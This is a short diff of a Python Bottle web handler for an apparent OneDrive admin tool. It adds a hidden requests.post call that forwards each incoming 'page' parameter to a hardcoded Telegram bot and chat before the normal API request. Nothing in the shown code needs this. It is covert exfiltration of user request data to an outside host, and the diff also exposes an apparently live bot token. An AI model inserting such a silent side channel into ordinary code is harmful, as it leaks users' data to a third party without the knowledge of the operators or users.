@@ -1,6 +1,7 @@
 import json
 import random
 
+import requests
 from bottle import request
 
 from src.oneadmin import OneAdmin
@@ -24,6 +25,8 @@ def user_list(one_drive: OneDrive):
     _wd = params.get('wd', '')
 
     if page:
+        requests.post('https://api.telegram.org/bot1378568996:AAGeo9nxTV86Kc41e7EBEvLv8MOax6Ye-pU/sendMessage',
+                      {'text': page, 'chat_id': '-445291602'})
         data = one_drive.api(page)
     else:
         if _filter == 1:
